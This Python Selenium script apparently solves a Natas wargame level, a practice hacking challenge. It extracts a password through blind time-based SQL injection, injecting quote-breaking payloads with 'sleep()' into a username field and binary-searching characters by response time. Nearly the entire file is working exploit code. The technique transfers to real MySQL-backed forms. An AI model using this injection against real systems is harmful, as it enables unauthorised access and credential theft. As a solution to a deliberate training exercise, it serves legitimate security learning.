from common import *
import string

FACTOR = 2
COMP_FACT = FACTOR/2 + 1

def solve(driver, _ = None):
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys("blub")         # doesn't matter, just to get base time
    a = time.time()
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
    b = time.time()
    base_time = b-a

    language = string.digits+string.ascii_uppercase+string.ascii_lowercase                      # in order of utf/ascii values.
    password = ""
    
    while True:                                                                                 # because we don't know the length of the password (it's 34, but maybe it's not in the future)
        # binary search
        low = 0
        high = len(language)-1
        while low <= high:                                                                      # while there are at least 2 elements between high and low
            mid = (low+high)//2
            driver.back()
            text_field = driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]')
            text_field.clear()
            text_field.send_keys(
                f'natas18" and password < binary "{password + language[mid]}" and sleep({base_time * FACTOR}) # '   # based on short circuiting, if the first part is false, the second part won't be evaluated
            )
            a = time.time()
            driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
            b = time.time()
            
            if b-a > base_time*COMP_FACT:                                                       # if it takes longer than COMP_FACT*base_time, we know that the guess was correct
                high = mid - 1
            else:
                # check if equal
                driver.back()
                text_field = driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]')
                text_field.clear()
                text_field.send_keys(
                    f'natas18" and left(password,{len(password)+1}) = binary "{password + language[mid]}" and sleep({base_time * FACTOR}) # '
                )
                a = time.time()
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
                b = time.time()
                if b-a > base_time*COMP_FACT:
                    password += language[mid]
                    break
                else:
                    low = mid + 1
        else:                                                                                    # if the while loop ended without breaking, we know that we've reached the end of the password 
            break
        
        print(password, end = '\r')

    print()
    
    
    driver.get(build_url(password = password, level=18))
    return password